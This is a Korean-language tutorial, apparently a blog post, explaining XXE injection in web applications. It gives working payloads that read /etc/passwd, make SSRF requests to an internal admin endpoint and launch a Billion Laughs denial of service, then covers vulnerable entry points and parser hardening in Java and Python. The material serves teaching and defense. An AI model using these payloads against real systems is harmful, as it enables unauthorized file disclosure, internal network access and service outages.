## 🔍 XXE란? 

**XML 외부 엔티티(External Entity)** 기능은 XML 문서 내에서 외부의 데이터를 참조할 수 있도록 해주는 기능입니다. XML 처리 과정에서 발생할 수 있는 보안 취약점으로, 공격자가 악의적인 \*\*외부 엔티티(External Entity)\*\*를 정의하고 이를 이용해 **민감한 정보에 접근하거나**, **서버의 자원을 공격**하는 기법입니다.
예를 들어, XML 파서가 DTD(문서 유형 정의, Document Type Definition)를 처리하면서 외부 파일이나 URL을 로드하도록 허용할 때 문제가 발생할 수 있습니다.

### 🔓 발생 조건

* XML 파서를 사용하는 웹 애플리케이션
* DTD 선언이 허용되어 있음
* 외부 엔티티 참조가 활성화되어 있음 (보통 `DOCTYPE` 선언 허용)


### 💼 시나리오: 서버에서 XML 업로드/처리를 하는 API

어떤 웹 서비스가 XML 기반의 파일 업로드를 지원하고, 이 파일을 서버에서 파싱하여 처리한다고 가정합니다.

공격자는 아래와 같은 **악성 XML**을 업로드합니다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

### 🔍 결과:

* XML 파서가 `&xxe;`를 해석하면서 로컬 파일 시스템의 `/etc/passwd` 파일 내용을 불러오게 됨
* 이 정보가 응답으로 출력되거나 로그에 기록되면, 공격자는 민감한 정보를 획득할 수 있음

---

## 💡 웹에서의 XXE 공격이란?


웹 애플리케이션에서 **XXE(External Entity Injection)** 공격은, 서버가 클라이언트로부터 **XML 데이터를 받아 파싱**할 때 발생합니다.

특히 REST API, 파일 업로드, SOAP 기반 웹서비스 등에서 XML 데이터를 처리하는 경우가 많으며, 이때 **잘못 구성된 XML 파서**를 통해 공격이 이루어질 수 있습니다.

> 클라이언트가 웹 애플리케이션에 전송한 \*\*XML 데이터에 악성 외부 엔티티(External Entity)\*\*를 삽입하여, 서버의 **내부 파일을 읽거나**, \*\*내부 시스템에 접근(SSRF)\*\*하거나, \*\*서비스 거부(DoS)\*\*를 유발하는 공격


## 🧪 웹 기반 공격 시나리오 예시

### 🖼️ 시나리오: XML 업로드 기능이 있는 웹 서비스

웹 애플리케이션이 아래와 같은 API를 제공한다고 가정합니다:

```http
POST /upload-xml HTTP/1.1
Host: vulnerable.site
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<user>
  <name>홍길동</name>
</user>
```

서버에서는 이 XML을 받아 파싱하고, `<name>` 태그 값을 DB에 저장합니다.

---

### 🔥 공격자가 아래와 같은 요청을 전송:

```http
POST /upload-xml HTTP/1.1
Host: vulnerable.site
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

### 🧨 서버에서 발생하는 일:

* 서버의 XML 파서가 `<!DOCTYPE>`와 `<!ENTITY>` 선언을 처리함
* `&xxe;`가 `/etc/passwd` 파일의 내용으로 대체됨
* 최종적으로 DB 또는 응답에 민감한 데이터가 포함됨 → 정보 유출

---

## 🧫 웹에서 사용 가능한 XXE 페이로드 예시

### 1. 🧾 로컬 파일 노출

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### 2. 🌐 SSRF (내부망 요청 유도)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://localhost:8000/admin">
]>
<data>&xxe;</data>
```

→ 보안 그룹으로 막혀 있는 **내부 서비스에 접근 가능**

### 3. 💣 Billion Laughs (DoS 공격)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
```

→ 수많은 반복된 엔티티 확장으로 CPU와 메모리 과부하 → 서버 다운

---

## 🔍 웹에서 자주 노출되는 XXE 취약점 포인트

| 취약 지점        | 설명                                                     |
| ------------ | ------------------------------------------------------ |
| 📄 파일 업로드    | XML 기반의 `.xml`, `.svg`, `.plist`, `.wsdl` 등을 업로드 받아 처리 |
| 📦 REST API  | `Content-Type: application/xml` 로 XML 데이터를 처리하는 API    |
| 🧼 SOAP 웹서비스 | XML 기반으로 동작, 내부적으로 XML 파서 사용                           |
| 🔐 SAML 인증   | 인증 토큰에 XML 사용, SAMLRequest 및 SAMLResponse 파싱시 발생 가능    |

---

## 🛡️ XXE 방어 방법 (웹 측면)

### ✅ 1. XML 파서 설정 변경

* 외부 엔티티 해제

  * Java:

    ```java
    SAXParserFactory factory = SAXParserFactory.newInstance();
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    ```
  * Python (lxml):

    ```python
    etree.XMLParser(resolve_entities=False)
    ```

### ✅ 2. XML 대신 JSON으로 전환

* JSON은 엔티티 선언이나 외부 참조 기능이 없음 → 구조적으로 안전

### ✅ 3. 요청 차단 (WAF or Filter)

* `<!DOCTYPE`, `<!ENTITY` 등의 키워드를 필터링하거나 탐지
* HTTP 보안 정책 설정

